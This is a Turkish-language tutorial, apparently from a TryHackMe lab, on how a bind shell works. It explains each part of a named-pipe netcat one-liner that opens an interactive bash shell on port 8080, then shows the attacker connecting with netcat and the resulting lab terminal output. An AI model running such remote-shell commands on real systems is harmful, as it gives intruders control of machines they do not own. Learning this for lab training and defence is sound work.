## Bind Shell

Adından da anlaşılacağı gibi bir **bind shell**, ele geçirilmiş sistem üzerinde bir portu bağlar (bind) ve bir bağlantı için dinlemeye geçer; bu bağlantı gerçekleştiğinde, saldırganın uzaktan komut yürütebilmesi için shell oturumunu dışarıya açar.

Bu yöntem, ele geçirilen hedefin dışa giden (outgoing) bağlantılara izin vermediği durumlarda kullanılabilir; ancak aktif kalması ve bağlantı beklemesi gerektiği için tespit edilme olasılığı daha yüksektir, bu nedenle genellikle daha az popülerdir.

### Bind Shell Nasıl Çalışır?

#### Hedef Üzerinde Bind Shell Kurulumu

Bir bind shell oluşturalım. Bu durumda saldırgan, hedef makine üzerinde aşağıdakine benzer bir komut kullanabilir:

`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`

#### Payload'ın Açıklaması

- **rm -f /tmp/f**: Bu komut, `/tmp/f/` adresinde bulunan mevcut herhangi bir **named pipe** (adlandırılmış boru) dosyasını siler. Bu, betiğin çakışma olmadan yeni bir named pipe oluşturabilmesini sağlar.
    
- **mkfifo /tmp/f**: Bu komut, `/tmp/f` konumunda bir **named pipe** veya **FIFO** oluşturur. Named pipe'lar, süreçler (processes) arasında iki yönlü iletişime izin verir. Bu bağlamda, girdi ve çıktı için bir kanal görevi görür.
    
- **cat /tmp/f**: Bu komut, named pipe'dan veri okur. Pipe üzerinden gönderilebilecek girdiyi bekler.
    
- **| bash -i 2>&1**: `cat` komutunun çıktısı, saldırganın komutları etkileşimli olarak yürütmesine olanak tanıyan bir shell örneğine (**bash -i**) yönlendirilir. `2>&1` kısmı, **standard error**'u **standard output**'a yönlendirerek hata mesajlarının saldırgana geri dönmesini sağlar.
    
- **| nc -l 0.0.0.0 8080**: Netcat'i tüm arayüzlerde (**0.0.0.0**) ve **8080** portunda dinleme modunda (`-l`) başlatır. Saldırgan bu porta bağlandığında shell dışarıya açılacaktır.
    
- **>/tmp/f**: Bu son kısım, komutların çıktısını tekrar named pipe içine göndererek iki yönlü iletişime olanak tanıyar.
    

Yukarıdaki komut gelen bağlantıları dinleyecek ve bir **bash shell**'i dışarı aktaracaktır. 1024'ün altındaki portların, Netcat'in yüksek ayrıcalıklarla (elevated privileges) çalıştırılmasını gerektireceğini unutmamalıyız. Bu durumda 8080 portunu kullanmak bu gereklilikten kaçınmamızı sağlar.

#### Hedef Makinedeki Terminal (Bind Shell Kurulumu)

##### Terminal

Bash

```
target@tryhackme:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

Komut yürütüldüğünde, yukarıda gösterildiği gibi gelen bir bağlantıyı bekleyecektir.

---

### Saldırganın Bind Shell'e Bağlanması

Hedef makine gelen bağlantıları beklediğine göre, bağlanmak için Netcat'i tekrar aşağıdaki komutla kullanabiliriz:

`nc -nv TARGET_IP 8080`

#### Komutun Açıklaması

- **nc**: Hedefe bağlantıyı kuran Netcat'i çağırır.
    
- **-n**: DNS çözümlemesini devre dışı bırakarak Netcat'in daha hızlı çalışmasını sağlar ve gereksiz sorgulardan kaçınır.
    
- **-v**: **Verbose** modu, bağlantı kurulduğunda olduğu gibi bağlantı sürecine dair ayrıntılı çıktı sağlar.
    
- **TARGET_IP**: Bind shell'in çalıştığı hedef makinenin IP adresi.
    
- **8080**: Bind shell'in dinlediği port numarası.
    

#### Saldırgan Terminali (Bağlantıdan Sonra)

##### Terminal

Bash

```
attacker@kali:~$ nc -nv 10.10.13.37 8080
(UNKNOWN) [10.10.13.37] 8080 (http-alt) open

target@tryhackme:~$
```